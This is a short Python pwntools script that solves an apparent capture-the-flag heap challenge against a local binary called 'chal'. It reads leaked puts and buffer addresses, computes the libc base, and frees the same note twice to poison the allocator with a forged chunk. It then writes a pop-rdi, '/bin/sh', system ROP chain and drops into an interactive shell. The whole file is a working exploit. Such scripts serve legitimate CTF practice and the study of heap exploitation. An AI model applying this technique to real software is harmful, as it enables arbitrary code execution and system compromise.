from pwn import process, ELF, p64, PTY

target = ELF("./chal")
libc = ELF("libc.so.6")
io = process(target.path, stdin=PTY, stdout=PTY)

def create_note(data: bytes):
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(data)

def delete_note(index: int):
    io.recvuntil(b'> ')
    io.sendline(b'4')
    io.sendline(str(index).encode('utf-8'))

def exit_program():
    io.recvuntil(b'> ')
    io.sendline(b'5')

io.recvuntil(b'0x')
choice_addr_hex = io.recvline()[:-1].decode('utf-8')
choice_addr = int(choice_addr_hex, 16)
io.recvuntil(b'0x')
puts_addr_hex = io.recvline()[:-1].decode('utf-8')
puts_addr = int(puts_addr_hex, 16)

libc_base = puts_addr - libc.sym['puts']

system = libc_base + libc.sym['system']
pop_rdi = 0x401893
bin_sh = libc_base + 0x17fc96

forged_chunk = choice_addr + 20
written_data = p64(pop_rdi) + p64(bin_sh) + p64(system)

create_note(b'whatever')
delete_note(0)
delete_note(0)
create_note(p64(forged_chunk))
create_note(b'')
create_note(written_data)
exit_program()

io.interactive()
